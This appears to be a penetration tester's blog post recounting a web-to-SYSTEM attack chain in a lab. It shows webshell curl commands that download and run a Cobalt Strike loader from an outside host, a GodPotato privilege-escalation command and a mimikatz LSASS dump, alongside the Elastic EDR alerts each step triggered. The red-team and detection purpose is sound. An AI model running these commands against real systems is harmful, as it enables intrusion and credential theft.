---
title: Increase your stealth capabilities - part 1
date: 2024-01-04
categories: [ "Malware Development" ]
tags: [ "research", "command and control", "windows", "edr", "tooling", "detection", "elastic" ]     # TAG names should always be lowercase
---

In a recent assessment, my teammates and I were tasked to perform a web security review of several applications with the possibility to perform internal pentest if the opportunity came up.

On one of the application, we successfully uploaded a aspx webshell which executes Windows cmd. The engagement didn’t require us to be stealthy and the goal of this blog post is to reproduce our what we did with Elastic EDR watching us.

## Web RCE

We downloaded our CobaltStrike loader and executed it

```bash
> curl http://website.crash.lab/webshell.aspx --data '70c1cc863a=powershell wget http://xxxx.com/load.exe -outfile C:\Windows\Temp\load.exe'
> curl http://website.crash.lab/webshell.aspx --data '70c1cc863a=C:\Windows\Temp\load.exe'
```

And we got our beacon back

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/initial-cs.png)

If we look at the alerts in Elastic EDR, we can see that we were very noisy.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/initial-alerts.png)


- `Web Shell Detection: Script Process Child of Common Web Processes` because the IIS process w3wp.exe spawned `cmd.exe`
- `Malicious Behavior Detection Alert: Suspicious Microsoft IIS Worker Descendant` because the IIS process w3wp.exe spawned cmd.exe that suggest the web server has been compromised
- `Remote File Download via PowerShell` because of the `wget` Powershell command to download our loader
- `Memory Threat Detection Alert: Windows.Trojan.CobaltStrike` because Elastic EDR Yara rules flagged our beacon in memory
- `Malicious Behavior Detection Alert: Network Module Loaded from Suspicious Unbacked Memory` - as our beacon is stored in unbacked memory, Elastic EDR caught an API call that came from this suspicious region


The next step of our exploitation was to escalate our privileges from Local Service Account to Local Administrator.

We can do it in two different ways:

- abuse `SeImpersonatePrivilege` privilege to escalate to SYSTEM (we used this way during the engagement)
- abuse Kerberos `S4U2Self` to generate a Service Ticket for a domain user which has local administrator right


## EoP - SeImpersonatePrivilege

We used GodPotato to exploit the `SeImpersonatePrivilege`

```bash
beacon> execute-assembly /home/user/Tools/Windows/GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\load.exe"
```

And we got our SYSTEM beacon back.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/system-cs.png)

The last action raised the following alerts:

- `Malicious Behavior Detection Alert: Microsoft Common Language Runtime Loaded from Suspicious Memory` - because CLR.dll has been loaded by the post-exploit temporary process
- `Malicious Behavior Detection Alert: AMSI or WLDP Bypass via Memory Patching` - the CobaltStrike AMSI patch has been flagged


## LSASS dump

After we gained SYSTEM privileges, we launched the built-in mimikatz command to dump credentials from LSASS.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/logonpassword-cs.png)


Which raised alerts:

- `LSASS Process Access via Windows API`
- `Memory Threat Detection Alert: Windows.Hacktool.Mimikatz`
- `LSASS Access Attempt from Unbacked Memory`

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part1/alerts-2.png)

## Conclusion

As we can saw, there are plenty of opportunities to detect our actions during the different phase of the attack path:

- execution of a webshell
- execution of an .NET assembly through execute-assembly
- LSASS dump

In the [next part](/posts/increase-stealth-capabilities-part2/) I will go through each steps again but with detection in mind.